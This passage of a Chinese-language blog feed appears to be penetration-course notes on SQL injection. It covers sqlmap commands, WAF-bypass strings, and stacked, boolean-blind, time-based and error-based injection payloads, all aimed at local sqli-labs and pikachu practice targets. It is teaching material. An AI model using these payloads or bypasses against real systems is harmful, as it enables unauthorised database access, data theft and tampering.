        <content type="html"><![CDATA[<h1>SQL注入之sqlmap使用(post注入)</h1><p>POST型：与数据库交互是通过post数据进行，URL不可见</p><h3>利用sqlmap进行POST注入，常见的有三种方法:</h3><h2>注入方式一：</h2><p><strong>1.用Burp抓包，然后保存抓取到的内容。例如：保存为1.txt,然后把它放至某个目录下</strong></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1651663711000/4acf54c747204860a73fe74a42a8c8c2.png" alt="image.png" class="align-none"></p><p><strong>2.列数据库:</strong></p><p>sqlmap.py -r C:\Users\ZQ\Desktop\1.txt -p uname --dbs</p><p>也可以使用  *  指定需要测试的参数</p><p><strong>it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]</strong><br>它看起来像后端DBMS是'MySQL'。 是否要跳过特定于其他DBMS的测试负载？ [Y/n]  输入"Y"</p><p><strong>for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]</strong><br>对于剩余的测试，您想要包括所有针对“MySQL”扩展提供的级别（1）和风险（1）值的测试吗？ [Y/n] 输入"N"</p><p><strong>POST parameter 'n' is vulnerable. Do you want to keep testing the others (if any)? [y/N]</strong><br>POST参数'n'是脆弱的。 你想继续测试其他人（如果有的话）吗？[y/N]  输入"Y"</p><h3>3.猜表</h3><p>选择一个数据库，比如选test</p><p>sqlmap.py -r C:\Users\ZQ\Desktop\1.txt -p uname -D test --tables</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1651663711000/583ad73419114e1ea19656c1102841d1.png" alt="image.png" class="align-none"></p><p><strong>4.猜列</strong></p><p>sqlmap.py -r C:\Users\ZQ\Desktop\1.txt -p uname -D test  -T t1 --columns</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1651663711000/f96cf3e6a13d4e90a7e3a051bf3fe64f.png" alt="image.png" class="align-none"></p><h2>注入方式二：自动搜索表单的方式</h2><p>sqlmap.py  -u "<a href="http://localhost/sqli-labs-master/Less-11/index.php" target="_blank">http://localhost/sqli-labs-master/Less-11/index.php</a>" --forms</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1651663711000/d1b1a089b2824e80a36551e501cfbe64.png" alt="image.png" class="align-none"></p><p>do you want to test this form? [Y/n/q]<br>要测试此表单吗?[Y/n/q]  输入"Y"</p><p>do you want to fill blank fields with random values? [Y/n]<br>是否要填充带有随机值的空白字段? [Y/n]  输入"Y"</p><p>it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]<br>它看起来像后端DBMS是'MySQL'。 是否要跳过特定于其他DBMS的测试负载？ [Y/n] 输入"Y"</p><p>for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]<br>对于剩余的测试，您想要包括所有针对“MySQL”扩展提供的级别（1）和风险（1）值的测试吗？[Y/n]  输入"N"</p><p>POST parameter 'n' is vulnerable. Do you want to keep testing the others (if any)? [y/N]<br>POST参数'n'是脆弱的。 你想继续测试其他人（如果有的话）吗？[y/N]  输入"N"</p><p>do you want to exploit this SQL injection? [Y/n]<br>你想利用SQL注入？ 输入"Y"</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1651663711000/490d416ed490474db5c6b8d6adcca84e.png" alt="image.png" class="align-none"></p><p>常用命令：</p><pre><code>-r表示加载一个文件，-p指定参数--current-db 当前数据库--forms 自动检测表单-data   </code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>6.1SQL注入之sqlmap使用(get型注入)</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/6-sql-zhu-ru-zhi-sqlmap/6.1sql-zhu-ru-zhi-sqlmap-shi-yong-get-xing-zhu-ru/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/6-sql-zhu-ru-zhi-sqlmap/6.1sql-zhu-ru-zhi-sqlmap-shi-yong-get-xing-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之sqlmap使用(get型注入)</h1><h4>一、SQLMap介绍</h4><h5>1、Sqlmap简介：</h5><p>Sqlmap是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p><p>目前支持的数据库有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access等大多数据库。</p><h5>2、Sqlmap支持的注入方式：</h5><p>Sqlmap全面支持六种SQL注入技术：</p><ul><li>基于布尔类型的盲注：即可以根据返回页面判断条件真假的注入。</li><li>基于时间的盲注：即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行(即页面返回时间是否增加)来判断。</li><li>基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中。</li><li>联合查询注入：在可以使用Union的情况下的注入。</li><li>堆查询注入：可以同时执行多条语句时的注入。</li><li>带外注入：构造SQL语句，这些语句在呈现给数据库时会触发数据库系统创建与攻击者控制的外部服务器的连接。以这种方式，攻击者可以收集数据或可能控制数据库的行为。</li></ul><h4>二、SQLMap使用：</h4><h5>1、判断是否存在注入：</h5><p>假设目标注入点是 <code>http://127.0.0.1/sqli-labs/Less-1/?id=1</code>，判断其是否存在注入的命令如下：</p><pre><code>sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1</code><p><code></code></p></pre><p></p><p>当注入点后面的参数大于等于两个时,需要加双引号，如下所示。</p><pre><code>sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-1/?id=1&amp;uid=2"</code><p><code></code></p></pre><p></p><p>运行完判断是否存在注入的语句后，爆出一大段代码，这里有三处需要选择的地方：第一处的意思为检测到数据库可能是MySQL，是否需要跳过检测其他数据库；第二处的意思是在“level1、risk1”的情况下，是否使用MySQL对应的所有Payload进行检测；第三处的意思是参数 <code>id</code>存在漏洞，是否要继续检测其他参数，一般默认按回车键即可。</p><p>常用命令：</p><pre><code>-u:用于get提交方式，后面跟注入的url网址--level--risk<p>--dbs：获取所有数据库<br>--tales：获取所有数据表<br>--columns：获取所有字段<br>--dump：打印数据</p></code><p><code>-D：查询选择某个库<br>-T：查询选择某个表<br>-C：查询选择某个字段<br>level：执行测试的等级（1<del>5，默认为1），使用-level参数并且数值&gt;=2的时候会检查cookie里面的参数，<br>当&gt;=3时检查user-agent和refereer<br>risk：执行测试的风险（0</del>3,默认为1），默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，<br>3会增加or语句的sql注入 </code></p></pre><p></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>5.1SQL注入之WAF绕过</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/5-sql-zhu-ru-zhi-waf-rao-guo/5.1sql-zhu-ru-zhi-waf-rao-guo/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/5-sql-zhu-ru-zhi-waf-rao-guo/5.1sql-zhu-ru-zhi-waf-rao-guo/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之WAF绕过</h1><h3><code>WAF拦截原理：WAF从规则库中匹配敏感字符进行拦截。</code></h3><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1647683310000/eaf7c52124254ea59a9cba144ae61b53.png" alt="image.png" class="align-none"></p><h1>关键词大小写绕过</h1><pre><code>    有的WAF因为规则设计的问题，只匹配纯大写或纯小写的字符，对字符大小写混写直接无视，这时，我们可以利用这一点来进行绕过<pre><code>举例： union select ---&amp;gt; unIOn SeLEcT</code></pre></code><p><code></code></p></pre><p></p><h1>编码绕过</h1><pre><code>    针对WAF过滤的字符编码，如使用URL编码，Unicode编码，十六进制编码，Hex编码等.<pre><code>举例：union select 1,2,3# =union%0aselect 1\u002c2,3%23</code></pre></code><p><code></code></p></pre><p></p><h1>双写绕过</h1><pre><code>    部分WAF只对字符串识别一次，删除敏感字段并拼接剩余语句，这时，我们可以通过双写来进行绕过。<pre><code>举例：UNIunionON ，SELselectECT anandd</code></pre></code><p><code></code></p></pre><p></p><h1>换行(\N)绕过</h1><pre><code>    举例：select * from admin where username = \N union select 1,user() from admin</code></pre><h1>注释符内联注释绕过：</h1><pre><code><pre><code>union selecte =/*!union*/ select注释符里感叹号后面的内容会被mysql执行。</code></pre></code><p><code></code></p></pre><p></p><h1>同义词替换</h1><pre><code>    and=&amp;&amp;<pre><code>or=||=(等于号)=&amp;lt;、&amp;gt;空格不能使用=%09,%0a,%0b,%0c,%0d,%20,%a0等注：%0a是换行也可以替代空格</code></pre></code><p><code></code></p></pre><p></p><h1>HTTP参污染</h1><pre><code>    对目标发送多个参数，如果目标没有多参数进行多次过滤，那么WAF对多个参数只会识别其中的一个。<pre><code>举例：?id=1&amp;amp;id=2&amp;amp;id=3?id=1/**&amp;amp;id=-1%20union%20select%201,2,3%23*/</code></pre></code><p><code></code></p></pre><p></p><h3><code>WAF绕过的思路就是让WAF的检测规则，识别不到你所输入的敏感字符，利用上述所介绍的知识点，灵活结合各种方法，从而可以增加绕过WAF的可能性</code></h3><pre><code>order by绕过：%20/*//--/*/  V4.0联合绕过：union /*!--+/*%0aselect/*!1,2,3*/ --+from绕过： /*!06447%23%0afrom*/</code><p><code></code></p></pre><p></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>4.6SQL注入之堆叠注入</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.6sql-zhu-ru-zhi-dui-die-zhu-ru/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.6sql-zhu-ru-zhi-dui-die-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之堆叠注入</h1><p>在SQL中，分号 ；是用来表示一条sql语句的结束，试想一下我们在 ； 结束一个sql语句后面继续构造下一个语句<br>会不会一起执行？因此这个想法也就造就了堆叠注入。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1647588038000/830dbff902c24ed4a6d9b250462658ed.png" alt="image.png" class="align-none"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1647588038000/5a9c5e81ccd64a0b904801ad549a6beb.png" alt="image.png" class="align-none"></p><p>而union injection（联合注入）也是将两条语句合并在一起<br>两者之间有什么区别？区别就在于union执行语句类型有限，可以用来执行查询语句，而堆叠注入可以执行的是任意语句</p><p>Less-38</p><p><a href="http://localhost/sqli-labs-master/Less-38/?id=1%27;insert%20into%20users(id,username,password)%20values%20(%2722%27,%27mc%27,%27hello%27)--+" target="_blank">http://localhost/sqli-labs-master/Less-38/?id=1';insert into users(id,username,password) values ('22','mc','hello')--+</a></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1647588038000/a69172f8e1d44093821b77231f9fc0bd.png" alt="image.png" class="align-none"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>4.5SQL注入之加解密注入</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.5sql-zhu-ru-zhi-jia-jie-mi-zhu-ru/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.5sql-zhu-ru-zhi-jia-jie-mi-zhu-ru/</url>
      
        <content type="html"><![CDATA[<pre><code>SQL注入之加解密注入</code></pre><p>Base64是网络上最常见的用于传输8Bit<a href="https://baike.baidu.com/item/%E5%AD%97%E8%8A%82%E7%A0%81/9953683" target="_blank">字节码</a>的编码方式之一，Base64就是一种基于64个可打印字符来表示<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6/361457" target="_blank">二进制</a>数据的方法。</p><p>Less-21关 Cookie加密注入：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646742005000/0afa9058e7b34fcf84a2e61b79189c91.png" alt="image.png" class="align-none"></p><p>通过Burpsuite抓包：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646742005000/d02d59f88d1a483cbc362e968185ad67.png" alt="image.png" class="align-none"></p><p>进行Base64解密：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646742005000/2bd5296c6df64f0782ded364586544d1.png" alt="image.png" class="align-none"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>4.4SQL注入之布尔盲注</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.4sql-zhu-ru-zhi-bu-er-mang-zhu/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.4sql-zhu-ru-zhi-bu-er-mang-zhu/</url>
      
        <content type="html"><![CDATA[<pre><code>SQL注入之布尔盲注</code></pre><h3>1.什么是布尔盲注？</h3><p>Web的页面的仅仅会返回True和False。那么布尔盲注就是进行SQL注入之后然后根据页面返回的True或者是False来得到数据库中的相关信息。</p><p>返回False时：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646720755000/a9e2622c9ab4426eb95db68e9bc76ae2.png" alt="image.png" class="align-none"></p><p>返回True时：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646720755000/61d6681f946648d39f5c46ce47d0285a.png" alt="image.png" class="align-none"></p><h3>2.如何进行布尔盲注？</h3><p>注入流程：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646720755000/65e35005c1d24fb085b94bf42339e5df.png" alt="image.png" class="align-none"></p><h3>3.靶场案例演示：</h3><p>1.<strong> 猜解数据库的名字</strong></p><p>`http://127.0.0.1/sql/Less-5/index.php?id=1' and ascii(mid(database(),1,1))&gt;115--+ 非正常</p><p><a href="http://127.0.0.1/sql/Less-5/index.php?id=1" target="_blank">http://127.0.0.1/sql/Less-5/index.php?id=1</a>' and ascii(mid(database(),1,1))&gt;116--+ 非正常</p><p><a href="http://127.0.0.1/sql/Less-5/index.php?id=1" target="_blank">http://127.0.0.1/sql/Less-5/index.php?id=1</a>' and ascii(mid(database(),1,1))=115--+ 正常<br><a href="http://127.0.0.1/sql/less-5/index.php?id=1" target="_blank">http://127.0.0.1/sql/less-5/index.php?id=1</a>' and ascii(mid(database(),2,1))=101--+ 正常<br><a href="http://127.0.0.1/sql/less-5/index.php?id=1" target="_blank">http://127.0.0.1/sql/less-5/index.php?id=1</a>' and ascii(mid(database(),3,1))=99--+  正常`</p><p>如此就得到了</p><p>第一个字符的ASCII码为115解码出来为“s”</p><p>第二个字符的ASCII码为101解码出来为“e”</p><p>第二个字符的ASCII码为99解码出来为“c”</p><p>依次类推出数据库的名字为“security”</p><p>2.<strong>猜解表明名</strong></p><pre><code>http://127.0.0.1/sql/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114--+ 正确http://127.0.0.1/sql/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))=101--+ 正确</code></pre><p>注：select下的limit是第几个表。</p><p>substr下的是截取的表内容。</p><p>当前库下（注入点连接的数据库）第一个表ASCII码为<strong>114  解码为r</strong></p><p>当前库下（注入点连接的数据库）第一个表ASCII码为<strong>101  解码为e</strong></p><p><strong>当前库下（注入点连接的数据库）第一个表ASCII码为....</strong>  解码为<strong> referer</strong></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646720755000/02a961e381134335aec168900f9974ad.png" alt="image.png" class="align-none"></p><h3>总结归纳：</h3><p>盲注分为三种：</p><p><strong>1.<a href="http://www.cnblogs.com/xishaonian/p/6103505.html%20" target="_blank">布尔型盲注</a>：</strong> 根据页面返回的真假来判断的即为<strong>布尔型盲注</strong></p><p><strong>2.<a href="9ed06a9fbab342f27802e5d31a0f06d7" target="_blank">时间型盲注</a>：</strong> 根据页面返回的时间来判断的即为<strong>时间型盲注</strong></p><p><strong>3.报错型盲注</strong> ：根据页面返回的对错来判断的即为<strong>报错型盲注</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>4.3SQL注入之延时注入</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.3sql-zhu-ru-zhi-yan-shi-zhu-ru/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.3sql-zhu-ru-zhi-yan-shi-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1>基于时间的SQL盲注 - 延时注入</h1><p><strong>知识储备：</strong></p><p>sleep（）：                                     <em>Sleep</em> 函数可以使计算机程序（进程，任务或线程）进入休眠</p><p>if（）：                                           <em>i f</em> 是 计算机编程语言一个关键字，分支结构的一种</p><p>mid(a,b,c):                                      从b开始，截取a字符串的c位</p><p>substr(a,b,c)：                                从b开始，截取字符串a的c长度</p><p>left(database(),1),database() :         left(a,b)从左侧截取a的前b位</p><p>length(database())=8 ：                 判断长度</p><p>ord=ascii ascii(x)=100：                判断x的ascii值是否为100</p><p>在不使用sleep下查询数据所需要的时间：0.03秒</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/86721e1e6625491b89f6de0fd7c8189f.png" alt="image.png" class="align-none"></p><p>使用sleep可以使查询数据休眠指定时间</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/f3fd6f2e63db44c8adb5d1f84c7150e6.png" alt="image.png" class="align-none"></p><p>if（a,b,c）：可以理解在java程序中的三目运算符，a条件成立 执行b, 条件不成立，执行c</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/3705cd9bfb4e4b10ae8a8f81712c8c09.png" alt="image.png" class="align-none">的</p><p>使用if与sleep结合使用：<img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/c7279f60359d4778aa443db53705b252.png" alt="image.png" class="align-none"></p><p>达到延时数据显示，从而通过数据显示的时间判断数据对错!</p><p>使用靶场less-2来实现延时注入：</p><p>ocalhost/sqli-labs-master/Less-2/index.php?id=1%20and%20sleep(if(database()=%27test%27,0,5))</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/c48403abd1ff4026a2a9485290321fa7.png" alt="image.png" class="align-none"></p><p>可以通过length（）来判断数据库的长度</p><p><a href="http://localhost/sqli-labs-master/Less-2/index.php?id=1%20and%20sleep(if(length(database()" target="_blank">http://localhost/sqli-labs-master/Less-2/index.php?id=1 and sleep(if(length(database()</a>)=8,8,0))</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/b1de1ad243a04e6d952ca86f0b394a90.png" alt="image.png" class="align-none"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/4f36b025da8041809ae05b5948ae6ec3.png" alt="image.png" class="align-none"></p><p>mid（）使用：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/44847cfea0264c508384528490bf677e.png" alt="image.png" class="align-none"></p><p>substr()函数<br>Substr()和substring()函数实现的功能是一样的，均为截取字符串。</p><p>string substring(string, start, length)<br>string substr(string, start, length)<br>参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</p><p>substr()函数使用：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/f10a155fd6cf45a2a0d88159c51dc414.png" alt="image.png" class="align-none"></p><p>Left()函数</p><p>Left()得到字符串左部指定个数的字符</p><p>Left ( string, n ) string为要截取的字符串，n为长度。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/5fc2512b47444fd4a531725e7503a08f.png" alt="image.png" class="align-none"></p><p>通过以上函数可以来判断数据信息：</p><p><a href="http://localhost/sqli-labs-master/Less-2/index.php?id=1%20and%20sleep(if(mid(database(),1,1" target="_blank">http://localhost/sqli-labs-master/Less-2/index.php?id=1 and sleep(if(mid(database(),1,1</a>)=%27t%27,0,5))</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/8f63d5b742564ae18fda98666bc7df98.png" alt="image.png" class="align-none"></p><p>推荐使用ASCII码</p><p>1.防止引号 ‘  “ 转义</p><p>2.方便以后工具的使用</p><p>使用ascii函数（）</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1646639594000/6eea9e36b99d426184f938a0d29d5c85.png" alt="image.png" class="align-none"></p><p>结合场景使用：</p><p>select * from t1 where id=1 and if(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=120,sleep(3),0);</p><p>select * from t1 where id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=116,sleep(2),0);</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>4.1_2 SQL注入之查询方式</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.1-2-sql-zhu-ru-zhi-cha-xun-fang-shi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/4-sql-zhu-ru-di-si-zhang-cha-xun-fang-shi-ji-bao-cuo-zhu-ru/4.1-2-sql-zhu-ru-zhi-cha-xun-fang-shi/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之查询方式</h1><p>当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显得原因可能时SQL语句查询方式问题导致，这个时候我们需要用到报错或者盲注进行后续操作，同时在注入的过程中，提前了解其中SQL语句可以更好的选择对应的注入语句。</p><p>select 查询数据</p><p>例如：在网站应用中进行数据显示查询操作</p><pre><code>select * from user where id=$id</code></pre><h2>delete 删除数据</h2><p>例如：后台管理里面删除文章删除用户等操作</p><pre><code>delete from user where id=$id</code></pre><h2>insert 插入数据</h2><p>例如：在网站应用中进行用户注册添加操作</p><pre><code>inser into user （id,name,pass） values(1,'zhangsan','1234')</code></pre><h2>update 更新数据</h2><p>例如：后台中心数据同步或者缓存操作</p><pre><code>update user set pwd='p' where id=1</code></pre><h1>SQL注入 报错盲注</h1><p>盲注就是在注入的过程中，获取的数据不能显示到前端页面，此时，我们需要利用一些方法进行判断或者尝试，我们称之为盲注。我们可以知道盲注分为以下三类：</p><h3>1.基于布尔的SQL盲注 - 逻辑判断</h3><p>regexp like ascii left ord mid</p><h3>2.基于时间的SQL盲注 - 延时判断</h3><p>if sleep</p><h3>3.基于报错的SQL盲注 - 报错回显（强制性报错   ）</h3><p>函数解析：</p><p><strong>updatexml():从目标XML中更改包含所查询值的字符串</strong></p><p>第一个参数：XML_document 是String格式，为XML文档对象的名称，文中为DOC</p><p>第二个参数：XPath_string(Xpath格式字符串)</p><p>第三个参数：new_value,String格式，替换查找到的符合条件的数据</p><p>updatexml（XML_document,XPath_String,new_value）;</p><p>'or updatexml(1,concat(0x7e,database()),0)or'</p><p><strong>extractvalue():从目标XML中返回包含所查询值的字符串</strong></p><p>第一个参数：XML_document 是String格式，为XML文档对象的名称，文中为DOC</p><p>第二个参数：XPath_String (Xpath格式字符串)</p><p>extractvalue(XML_document,XPath_String)</p><p>' or extractvalue(1,concat(0x7e,database())) or'</p><p>' union select 1,extractvalue(1,concat(0x7e,(select version())))%23</p><p>函数应用：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645865257000/54b8dd46c3ae496297e6610d3d8530d2.png" alt="image.png" class="align-none"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645865257000/c6b4a764335541d290e8c59fb9a1daf2.png" alt="image.png" class="align-none"></p><p>floor()向下取整  floor（10.5）  =  10<br>rand（）随机数 0 ~ 1之间<br>count（*）函数返回表的记录数。<br>concat函数：将多个字符串连接成一个字符串<br>group_by 根据by对数据按照哪个字段、进行分组，或者是哪几个字段进行分组（去重）。<br>会建立一张临时表<br>注意：多个字段分组要使用某个列的聚合函数 cout sum等</p><p>pikachu insert</p><p>username=x' or (select 1 from (select count(*),concat((select))</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>3.3SQL注入靶场案例练习</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/3-sql-zhu-ru-di-san-zhang-shu-ju-lei-xing-yu-ti-jiao-fang-shi/3.3sql-zhu-ru-ba-chang-an-li-lian-xi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/3-sql-zhu-ru-di-san-zhang-shu-ju-lei-xing-yu-ti-jiao-fang-shi/3.3sql-zhu-ru-ba-chang-an-li-lian-xi/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入靶场案例练习</h1><h3>Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</h3><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645703752000/248050e80cb94ba4819ece5c9a45072d.png" alt="image.png" class="align-none"></p><p><strong>用burpsuit，抓包修改参数</strong></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645703752000/5a2399e3e7a0467abd0dab8e36ad9550.png" alt="image.png" class="align-none"></p><p>联合查询union select测试payload</p><p>uname=admin' union select 1,2  --+&amp;passwd=admin&amp;submit=Submit</p><p>爆库payload</p><p>uname=admin' union select 1,database() --+&amp;passwd=admin&amp;submit=Submit</p><h3><strong>Less-20</strong> POST - Cookie injections - Uagent field  - Error based (基于错误的cookie头部POST注入)</h3><p>单引号，报错型，cookie型注入。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645703752000/5f681aa84f7144c5aa6471c997b61896.png" alt="image.png" class="align-none"></p><p>存在魔术引号</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645703752000/7970543bbc6a4225a7479a1e73d412c1.png" alt="image.png" class="align-none"></p><p>直接cookie注入，进行绕过</p><p>Cookie: uname=-admin' union select 1,2,database()--+</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645703752000/4240a5acf9ed49ac8326cdd95dc252d7.png" alt="image.png" class="align-none"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>3.2SQL注入之提交方式</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/3-sql-zhu-ru-di-san-zhang-shu-ju-lei-xing-yu-ti-jiao-fang-shi/3.2sql-zhu-ru-zhi-ti-jiao-fang-shi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/3-sql-zhu-ru-di-san-zhang-shu-ju-lei-xing-yu-ti-jiao-fang-shi/3.2sql-zhu-ru-zhi-ti-jiao-fang-shi/</url>
      
